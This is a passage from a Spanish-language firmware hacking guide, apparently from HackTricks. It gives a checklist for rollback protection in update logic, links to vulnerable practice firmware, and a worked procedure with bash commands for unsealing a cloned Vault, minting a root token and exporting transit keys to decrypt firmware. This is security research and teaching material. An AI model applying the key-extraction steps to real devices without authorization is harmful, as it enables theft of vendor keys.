- Una rutina del tipo `prepare_passive_slot()` que borra un slot basándose en un estado obsoleto en vez del **layout confirmado actual**.
- Una función del tipo `part_write_layout()` que solo incrementa un **contador de generación** / flag activo y no almacena el hash de la imagen validada.
- Comprobaciones del ratchet implementadas en userspace o en el código del updater, pero **no** en las etapas de ROM / bootloader / secure boot.
- Rutinas de borrado o recuperación que dejan el slot marcado como arrancable incluso después de que se haya borrado y reescrito su contenido.

### Lista de verificación para evaluar la lógica de actualización

* ¿Está adecuadamente protegido el transporte/autenticación del *endpoint* de actualización (TLS + autenticación)?
* ¿El dispositivo compara **números de versión** o un **contador anti-rollback monotónico** antes de flashear?
* ¿Se verifica la imagen dentro de una cadena de secure boot (por ejemplo, firmas comprobadas por código ROM)?
* ¿El **bootloader aplica el mismo ratchet** que el updater, en lugar de comprobar únicamente la firma/CRC?
* ¿Los metadatos de activación del slot están **vinculados al digest/versión del firmware validado**, o se puede modificar un slot después de promocionarlo?
* Tras un cambio de slot exitoso, ¿se fuerza el reinicio del dispositivo o siguen siendo accesibles otras rutinas de actualización/borrado durante la misma sesión?
* ¿El código de userland realiza comprobaciones de coherencia adicionales (por ejemplo, mapa de particiones permitido, número de modelo)?
* ¿Los flujos de actualización *parcial* o de *backup* reutilizan la misma lógica de validación?

> 💡  Si falta alguno de los elementos anteriores, es probable que la plataforma sea vulnerable a ataques de rollback.

## Firmware vulnerable para practicar

Para practicar cómo descubrir vulnerabilidades en firmware, usa los siguientes proyectos de firmware vulnerable como punto de partida.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Recuperar claves de descifrado de firmware a partir del estado de KMS/Vault integrado

Cuando una imagen de actualización combina metadatos pequeños en texto plano con un blob grande de alta entropía, analiza primero el contenedor antes de intentar fuerza bruta:<sup>[[1]](#references)</sup>

- Extrae los encabezados, offsets y límites de línea con `hexdump`, `xxd`, `strings -tx`, `base64 -d` y `binwalk -E`.
- `Salted__` suele indicar el formato `enc` de OpenSSL: los siguientes 8 bytes son la sal y los bytes restantes son el texto cifrado.
- Un campo Base64 que se decodifica en exactamente `256` bytes indica claramente que probablemente se trata de un texto cifrado RSA-2048 que envuelve una contraseña/clave de sesión aleatoria del firmware.
- El material PGP separado en el mismo archivo suele proteger solo la autenticidad; no asumas que es el mecanismo de confidencialidad.

Si la búsqueda estática de claves (`grep`, `strings`, búsquedas de PEM/PGP) no da resultado, haz reverse engineering de la **ruta operativa de descifrado** en lugar de limitarte a buscar claves privadas:

- Descompila el binario del updater / de gestión y rastrea quién lee el blob cifrado, qué helper/API lo desenvuelve y qué nombre de clave lógico solicita.
- Busca en el sistema de archivos root extraído el estado de KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), además de archivos de unidad y scripts de inicio.
- Considera las instrucciones `vault operator unseal ...` en texto plano, las claves de recuperación, los tokens de bootstrap o los scripts locales de auto-unseal de KMS como equivalentes al material de clave privada.

Si el appliance incluye el binario original de Vault y el backend de almacenamiento, reproducir ese entorno suele ser más fácil que reimplementar las partes internas de Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Con root en el KMS clonado:

- Haz que las transit keys solo sean exportables dentro del clon aislado: `vault write transit/keys/<name>/config exportable=true`
- Exporta la unwrap key: `vault read transit/export/encryption-key/<name>`
- Prueba la clave RSA recuperada con el par exacto de padding/hash que usa el KMS. Un fallo al descifrar con PKCS#1 v1.5 y un fallo con el descifrado OAEP predeterminado **no** demuestran que la clave sea incorrecta; muchos flujos respaldados por Vault usan OAEP con SHA-256, mientras que las bibliotecas comunes usan SHA-1 de forma predeterminada.
- Si el payload empieza por `Salted__`, reproduce exactamente el KDF de OpenSSL del proveedor (`EVP_BytesToKey`, a menudo MD5 en dispositivos antiguos) antes de intentar el descifrado AES-CBC.

Esto convierte el «firmware cifrado» en un problema más general: **recuperar las claves operativas del lado del dispositivo y reproducir offline los parámetros exactos de unwrap + KDF**.

## Formación y certificaciones

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Cracking de firmware con Claude: habilidades de nivel sénior, autonomía de nivel júnior](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodología de pruebas de seguridad de firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Hacking práctico de IoT: la guía definitiva para atacar el Internet de las cosas](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Explotación de zero-days en hardware abandonado – blog de Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Cómo un dispositivo inteligente de $20 me dio acceso a tu casa](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Ahora ves mi: ahora estás pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Explotación del Tesla Wall Connector desde el conector del puerto de carga - Parte 2: omisión de la protección contra downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Haz que parpadee: explotación over-the-air del Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS en QEMU, parte 2: depuración y corrección](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
{{#include ../../banners/hacktricks-training.md}}
